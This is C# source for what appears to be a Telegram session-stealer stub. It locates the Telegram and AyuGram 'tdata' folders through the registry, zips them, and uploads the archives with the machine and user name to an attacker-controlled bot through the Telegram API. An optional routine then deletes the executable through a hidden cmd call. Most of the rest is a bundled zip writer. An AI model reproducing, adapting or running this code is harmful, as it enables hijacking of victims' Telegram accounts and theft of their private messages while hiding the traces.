using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Text;


namespace TgStub
{
    internal class Runtime
    {
        static void Main(string[] args)
        {
            XFinder.Backend();
        }
    }

    internal class XConfig
    {
        public static string token = "%TOKEN_BOT%";

        public static string chatid = "%CHATID%";

        public static string message = string.Concat(new string[]
        {
            "\ud83d\udda5 PC: ",
            Environment.MachineName,
            "\n\ud83c\udff4 User: ",
            Environment.UserName,
            "\n"
        });
    }
    internal class XFinder
    {
        public static void Backend()
        {
            try
            {
                string telegramTdataPath = null;
                string ayugramTdataPath = null;

                object telegramRegValue = Registry.GetValue("HKEY_CLASSES_ROOT\\tg\\DefaultIcon", null, "");
                if (telegramRegValue != null)
                {
                    string telegramPath = new FileInfo(telegramRegValue.ToString().Substring(1).Split(',')[0]).DirectoryName;
                    telegramTdataPath = Path.Combine(telegramPath, "tdata");
                }

                object ayugramRegValue = Registry.GetValue("HKEY_CLASSES_ROOT\\AyuGram.tg\\DefaultIcon", null, "");
                if (ayugramRegValue != null)
                {
                    string ayugramPath = new FileInfo(ayugramRegValue.ToString().Substring(1).Split(',')[0]).DirectoryName;
                    ayugramTdataPath = Path.Combine(ayugramPath, "tdata");
                }

                if (!string.IsNullOrEmpty(telegramTdataPath) && Directory.Exists(telegramTdataPath) && telegramTdataPath != ayugramTdataPath)
                {
                    string telegramArchivePath = Path.Combine(Path.GetTempPath(), "telegram.tdata.zip");

                    using (FileStream fileStream = new FileStream(telegramArchivePath, FileMode.Create))
                    using (XZip.ZipStorage zipStorage = XZip.ZipStorage.Create(fileStream, null, false))
                    {
                        XZip.ZipStorage.FolderZipping(telegramTdataPath, zipStorage);
                    }

                    XSender.Sender(telegramArchivePath, XConfig.message);
                }

                if (!string.IsNullOrEmpty(ayugramTdataPath) && Directory.Exists(ayugramTdataPath))
                {
                    string ayugramArchivePath = Path.Combine(Path.GetTempPath(), "ayugram.tdata.zip");

                    using (FileStream fileStream = new FileStream(ayugramArchivePath, FileMode.Create))
                    using (XZip.ZipStorage zipStorage = XZip.ZipStorage.Create(fileStream, null, false))
                    {
                        XZip.ZipStorage.FolderZipping(ayugramTdataPath, zipStorage);
                    }

                    XSender.Sender(ayugramArchivePath, XConfig.message);
                }
            }
            catch
            {
                return;
            }
            finally
            {
#if Melting
            XSender.MeltFile();
#else
                Environment.Exit(0);
#endif
            }
        }
    }


    internal class XSender
    {
        public static void Sender(string zipPath, string message)
        {
            try
            {
                ServicePointManager.Expect100Continue = true;
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;

                string apiUrl = "https://api.telegram.org/bot" + XConfig.token + "/sendDocument";
                string boundary = "------------------------" + DateTime.Now.Ticks.ToString("x");
                WebRequest webRequest = WebRequest.Create(apiUrl);
                webRequest.Method = "POST";
                webRequest.ContentType = "multipart/form-data; boundary=" + boundary;

                using (Stream requestStream = webRequest.GetRequestStream())
                {
                    WriteStringToStream(requestStream, "--" + boundary + "\r\n");
                    WriteStringToStream(requestStream, "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + XConfig.chatid + "\r\n");

                    WriteStringToStream(requestStream, "--" + boundary + "\r\n");
                    WriteStringToStream(requestStream, "Content-Disposition: form-data; name=\"caption\"\r\n\r\n" + message + "\r\n");

                    WriteStringToStream(requestStream, "--" + boundary + "\r\n");
                    WriteStringToStream(requestStream, "Content-Disposition: form-data; name=\"parse_mode\"\r\n\r\nHTML\r\n");

                    WriteStringToStream(requestStream, "--" + boundary + "\r\n");
                    WriteStringToStream(requestStream, "Content-Disposition: form-data; name=\"document\"; filename=\"" + Path.GetFileName(zipPath) + "\"\r\n");
                    WriteStringToStream(requestStream, "Content-Type: application/zip\r\n\r\n");

                    using (FileStream fileStream = new FileStream(zipPath, FileMode.Open, FileAccess.Read))
                    {
                        fileStream.CopyTo(requestStream);
                    }

                    WriteStringToStream(requestStream, "\r\n--" + boundary + "--\r\n");
                }

                using (WebResponse response = webRequest.GetResponse())
                using (Stream responseStream = response.GetResponseStream())
                using (StreamReader reader = new StreamReader(responseStream))
                {
                    reader.ReadToEnd();
                }

                if (File.Exists(zipPath))
                {
                    File.Delete(zipPath);
                }
            }
            catch
            {
                if (File.Exists(zipPath))
                {
                    File.Delete(zipPath);
                }
            }
        }

        private static void WriteStringToStream(Stream stream, string str)
        {
            byte[] bytes = Encoding.UTF8.GetBytes(str);
            stream.Write(bytes, 0, bytes.Length);
        }
   
#if Melting
        public static void MeltFile()
        {
            string fileName = Process.GetCurrentProcess().MainModule.FileName;
            string directoryName = Path.GetDirectoryName(fileName);
            string fileName2 = Path.GetFileName(fileName);
            string text = "/c timeout /t 1 && DEL /f \"" + fileName2 + "\"";
            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                UseShellExecute = false,
                CreateNoWindow = true,
                Arguments = text,
                WorkingDirectory = directoryName
            });
            Environment.Exit(0);
        }
#endif
}

    internal class XZip
    {
        public class ZipStorage : IDisposable
        {
            static ZipStorage()
            {
                for (int i = 0; i < CrcTable.Length; i++)
                {
                    uint num = (uint)i;
                    for (int j = 0; j < 8; j++)
                    {
                        if ((num & 1U) != 0U)
                        {
                            num = 3988292384U ^ (num >> 1);
                        }
                        else
                        {
                            num >>= 1;
                        }
                    }
                    CrcTable[i] = num;
                }
            }

            public static ZipStorage Create(Stream stream, string comment = null, bool leaveOpen = false)
            {
                return new ZipStorage
                {
                    _comment = (comment ?? string.Empty),
                    _zipFileStream = stream,
                    _access = FileAccess.Write,
                    _leaveOpen = leaveOpen
                };
            }

            public ZipFileEntry AddStream(Compression method, string filenameInZip, Stream source, DateTime modTime, string comment = null)
            {
                return this.AddStreamAsync(method, filenameInZip, source, modTime, comment);
            }

            private ZipFileEntry AddStreamAsync(Compression method, string filenameInZip, Stream source, DateTime modTime, string comment = null)
            {
                if (this._access == FileAccess.Read)
                {
                    throw new InvalidOperationException("Writing is not allowed");
                }
                ZipFileEntry zipFileEntry = new ZipFileEntry
                {
                    Method = method,
                    EncodeUTF8 = false,
                    FilenameInZip = this.NormalizedFilename(filenameInZip),
                    Comment = (comment ?? string.Empty),
                    Crc32 = 0U,
                    HeaderOffset = (long)((ulong)((uint)_zipFileStream.Position)),
                    CreationTime = modTime,
                    ModifyTime = modTime,
                    AccessTime = modTime
                };
                this.WriteLocalHeader(zipFileEntry);
                this.Store(zipFileEntry, source);
                source.Close();
                this.UpdateCrcAndSizes(zipFileEntry);
                this._files.Add(zipFileEntry);
                return zipFileEntry;
            }
            private void Close()
            {
                if (this._access != FileAccess.Read)
                {
                    uint num = (uint)_zipFileStream.Position;
                    uint num2 = 0U;
                    if (this._centralDirImage != null)
                    {
                        _zipFileStream.Write(this._centralDirImage, 0, this._centralDirImage.Length);
                    }
                    foreach (ZipFileEntry zipFileEntry in this._files)
                    {
                        long position = _zipFileStream.Position;
                        this.WriteCentralDirRecord(zipFileEntry);
                        num2 += (uint)(_zipFileStream.Position - position);
                    }
                    if (this._centralDirImage != null)
                    {
                        this.WriteEndRecord((long)((ulong)(num2 + (uint)this._centralDirImage.Length)), (long)((ulong)num));
                    }
                    else
                    {
                        this.WriteEndRecord((long)((ulong)num2), (long)((ulong)num));
                    }
                }
                if (this._zipFileStream == null || this._leaveOpen)
                {
                    return;
                }
                _zipFileStream.Flush();
                _zipFileStream.Dispose();
                this._zipFileStream = null;
            }

            private void WriteLocalHeader(ZipFileEntry zfe)
            {
                byte[] bytes = (zfe.EncodeUTF8 ? Encoding.UTF8 : ZipStorage.DefaultEncoding).GetBytes(zfe.FilenameInZip);
                byte[] array = ZipStorage.CreateExtraInfo(zfe);
                _zipFileStream.Write(new byte[] { 80, 75, 3, 4, 20, 0 }, 0, 6);
                _zipFileStream.Write(BitConverter.GetBytes(zfe.EncodeUTF8 ? 2048 : 0), 0, 2);
                _zipFileStream.Write(BitConverter.GetBytes((ushort)zfe.Method), 0, 2);
                _zipFileStream.Write(BitConverter.GetBytes(this.DateTimeToDosTime(zfe.ModifyTime)), 0, 4);
                _zipFileStream.Write(new byte[12], 0, 12);
                _zipFileStream.Write(BitConverter.GetBytes((ushort)bytes.Length), 0, 2);
                _zipFileStream.Write(BitConverter.GetBytes((ushort)array.Length), 0, 2);
                _zipFileStream.Write(bytes, 0, bytes.Length);
                _zipFileStream.Write(array, 0, array.Length);
            }

            private void WriteCentralDirRecord(ZipFileEntry zfe)
            {
                Encoding encoding = (zfe.EncodeUTF8 ? Encoding.UTF8 : ZipStorage.DefaultEncoding);
                byte[] bytes = encoding.GetBytes(zfe.FilenameInZip);
                byte[] bytes2 = encoding.GetBytes(zfe.Comment);
                byte[] array = ZipStorage.CreateExtraInfo(zfe);
                _zipFileStream.Write(new byte[] { 80, 75, 1, 2, 23, 11, 20, 0 }, 0, 8);
                _zipFileStream.Write(BitConverter.GetBytes(zfe.EncodeUTF8 ? 2048 : 0), 0, 2);
                _zipFileStream.Write(BitConverter.GetBytes((ushort)zfe.Method), 0, 2);
                _zipFileStream.Write(BitConverter.GetBytes(this.DateTimeToDosTime(zfe.ModifyTime)), 0, 4);
                _zipFileStream.Write(BitConverter.GetBytes(zfe.Crc32), 0, 4);
                _zipFileStream.Write(BitConverter.GetBytes(ZipStorage.Get32BitSize(zfe.CompressedSize)), 0, 4);
                _zipFileStream.Write(BitConverter.GetBytes(ZipStorage.Get32BitSize(zfe.FileSize)), 0, 4);
                _zipFileStream.Write(BitConverter.GetBytes((ushort)bytes.Length), 0, 2);
                _zipFileStream.Write(BitConverter.GetBytes((ushort)array.Length), 0, 2);
                _zipFileStream.Write(BitConverter.GetBytes((ushort)bytes2.Length), 0, 2);
                _zipFileStream.Write(BitConverter.GetBytes(0), 0, 2);
                _zipFileStream.Write(BitConverter.GetBytes(0), 0, 2);
                _zipFileStream.Write(BitConverter.GetBytes(0), 0, 2);
                _zipFileStream.Write(BitConverter.GetBytes(33024), 0, 2);
                _zipFileStream.Write(BitConverter.GetBytes(ZipStorage.Get32BitSize(zfe.HeaderOffset)), 0, 4);
                _zipFileStream.Write(bytes, 0, bytes.Length);
                _zipFileStream.Write(array, 0, array.Length);
                _zipFileStream.Write(bytes2, 0, bytes2.Length);
            }

            private static uint Get32BitSize(long size)
            {
                if (size < uint.MaxValue)
                {
                    return (uint)size;
                }
                return uint.MaxValue;
            }


            private void WriteEndRecord(long size, long offset)
            {
                long length = this._zipFileStream.Length;
                this._zipFileStream.Position = length;
                _zipFileStream.Write(new byte[] { 80, 75, 6, 6 }, 0, 4);
                _zipFileStream.Write(BitConverter.GetBytes(44L), 0, 8);
                _zipFileStream.Write(BitConverter.GetBytes(45), 0, 2);
                _zipFileStream.Write(BitConverter.GetBytes(45), 0, 2);
                _zipFileStream.Write(BitConverter.GetBytes(0U), 0, 4);
                _zipFileStream.Write(BitConverter.GetBytes(0U), 0, 4);
                _zipFileStream.Write(BitConverter.GetBytes((long)this._files.Count + this._existingFiles), 0, 8);
                _zipFileStream.Write(BitConverter.GetBytes((long)this._files.Count + this._existingFiles), 0, 8);
                _zipFileStream.Write(BitConverter.GetBytes(size), 0, 8);
                _zipFileStream.Write(BitConverter.GetBytes(offset), 0, 8);
                _zipFileStream.Write(new byte[] { 80, 75, 6, 7 }, 0, 4);
                _zipFileStream.Write(BitConverter.GetBytes(0U), 0, 4);
                _zipFileStream.Write(BitConverter.GetBytes(length), 0, 8);
                _zipFileStream.Write(BitConverter.GetBytes(1U), 0, 4);
                byte[] bytes = ZipStorage.DefaultEncoding.GetBytes(this._comment);
                _zipFileStream.Write(new byte[] { 80, 75, 5, 6, 0, 0, 0, 0 }, 0, 8);
                _zipFileStream.Write(new byte[]
                {
                byte.MaxValue, byte.MaxValue, byte.MaxValue, byte.MaxValue, byte.MaxValue, byte.MaxValue, byte.MaxValue, byte.MaxValue, byte.MaxValue, byte.MaxValue,
                byte.MaxValue, byte.MaxValue
                }, 0, 12);
                _zipFileStream.Write(BitConverter.GetBytes((ushort)bytes.Length), 0, 2);
                _zipFileStream.Write(bytes, 0, bytes.Length);
            }
            private Compression Store(ZipFileEntry zfe, Stream source)
            {
                byte[] array = new byte[16384];
                uint num = 0U;
                long position = this._zipFileStream.Position;
                long num2 = (source.CanSeek ? source.Position : 0L);
                Stream stream = ((zfe.Method == ZipStorage.Compression.Store) ? this._zipFileStream : new DeflateStream(this._zipFileStream, CompressionMode.Compress, true));
                zfe.Crc32 = uint.MaxValue;
                int num3;
                do
                {
                    num3 = source.Read(array, 0, array.Length);
                    if (num3 > 0)
                    {
                        stream.Write(array, 0, num3);
                    }
                    uint num4 = 0U;
                    while ((ulong)num4 < (ulong)((long)num3))
                    {
                        zfe.Crc32 = ZipStorage.CrcTable[(int)((zfe.Crc32 ^ (uint)array[(int)num4]) & 255U)] ^ (zfe.Crc32 >> 8);
                        num4 += 1U;
                    }
                    num += (uint)num3;
                }
                while (num3 > 0);
                stream.Flush();
                if (zfe.Method == ZipStorage.Compression.Deflate)
                {
                    stream.Dispose();
                }
                zfe.Crc32 ^= uint.MaxValue;
                zfe.FileSize = (long)((ulong)num);
                zfe.CompressedSize = (long)((ulong)((uint)(this._zipFileStream.Position - position)));
                if (zfe.Method != ZipStorage.Compression.Deflate || !source.CanSeek || zfe.CompressedSize <= zfe.FileSize)
                {
                    return zfe.Method;
                }
                zfe.Method = ZipStorage.Compression.Store;
                this._zipFileStream.Position = position;
                this._zipFileStream.SetLength(position);
                source.Position = num2;
                return this.Store(zfe, source);
            }
            private uint DateTimeToDosTime(DateTime dt)
            {
                return (uint)((dt.Second / 2) | (dt.Minute << 5) | (dt.Hour << 11) | (dt.Day << 16) | (dt.Month << 21) | (dt.Year - 1980 << 25));
            }

            private static byte[] CreateExtraInfo(ZipFileEntry zfe)
            {
                byte[] array = new byte[72];
                BitConverter.GetBytes(1).CopyTo(array, 0);
                BitConverter.GetBytes(32).CopyTo(array, 2);
                BitConverter.GetBytes(1).CopyTo(array, 8);
                BitConverter.GetBytes(24).CopyTo(array, 10);
                BitConverter.GetBytes(zfe.FileSize).CopyTo(array, 12);
                BitConverter.GetBytes(zfe.CompressedSize).CopyTo(array, 20);
                BitConverter.GetBytes(zfe.HeaderOffset).CopyTo(array, 28);
                BitConverter.GetBytes(10).CopyTo(array, 36);
                BitConverter.GetBytes(32).CopyTo(array, 38);
                BitConverter.GetBytes(1).CopyTo(array, 44);
                BitConverter.GetBytes(24).CopyTo(array, 46);
                BitConverter.GetBytes(zfe.ModifyTime.ToFileTime()).CopyTo(array, 48);
                BitConverter.GetBytes(zfe.AccessTime.ToFileTime()).CopyTo(array, 56);
                BitConverter.GetBytes(zfe.CreationTime.ToFileTime()).CopyTo(array, 64);
                return array;
            }

            private void UpdateCrcAndSizes(ZipFileEntry zfe)
            {
                long position = this._zipFileStream.Position;
                _zipFileStream.Position = zfe.HeaderOffset + 8L;
                _zipFileStream.Write(BitConverter.GetBytes((ushort)zfe.Method), 0, 2);
                _zipFileStream.Position = zfe.HeaderOffset + 14L;
                _zipFileStream.Write(BitConverter.GetBytes(zfe.Crc32), 0, 4);
                _zipFileStream.Write(BitConverter.GetBytes(ZipStorage.Get32BitSize(zfe.CompressedSize)), 0, 4);
                _zipFileStream.Write(BitConverter.GetBytes(ZipStorage.Get32BitSize(zfe.FileSize)), 0, 4);
                _zipFileStream.Position = position;
            }

            private string NormalizedFilename(string filename)
            {
                filename = filename.Replace('\\', '/');
                int num = filename.IndexOf(':');
                if (num >= 0)
                {
                    filename = filename.Remove(0, num + 1);
                }
                return filename.Trim(new char[] { '/' });
            }

            public void Dispose()
            {
                this.Dispose(true);
                GC.SuppressFinalize(this);
            }

            protected virtual void Dispose(bool disposing)
            {
                if (this._isDisposed)
                {
                    return;
                }
                if (disposing)
                {
                    this.Close();
                }
                this._isDisposed = true;
            }

            public static void FolderZipping(string folderPath, ZipStorage zip)
            {
                foreach (string text in Directory.GetFiles(folderPath, "*", SearchOption.AllDirectories))
                {
                    string text2 = text.Substring(folderPath.Length + 1);
                    using (FileStream fileStream = new FileStream(text, FileMode.Open))
                    {
                        zip.AddStream(ZipStorage.Compression.Deflate, text2, fileStream, File.GetLastWriteTime(text), null);
                    }
                }
            }

            private const bool EncodeUtf8 = false;

            private const bool ForceDeflating = false;

            private readonly List<ZipFileEntry> _files = new List<ZipFileEntry>();

            private Stream _zipFileStream;

            private string _comment = string.Empty;

            private readonly byte[] _centralDirImage;

            private readonly long _existingFiles;

            private FileAccess _access;

            private bool _leaveOpen;

            private bool _isDisposed;

            private static readonly uint[] CrcTable = new uint[256];

            private static readonly Encoding DefaultEncoding = Encoding.GetEncoding(437);

            public enum Compression : ushort
            {
                Store,
                Deflate = 8
            }

            public class ZipFileEntry
            {
                public override string ToString()
                {
                    return this.FilenameInZip;
                }

                public Compression Method;

                public string FilenameInZip;

                public long FileSize;

                public long CompressedSize;

                public long HeaderOffset;

                public uint Crc32;

                public DateTime ModifyTime;

                public DateTime CreationTime;

                public DateTime AccessTime;

                public string Comment;

                public bool EncodeUTF8;
            }
        }
    }
}
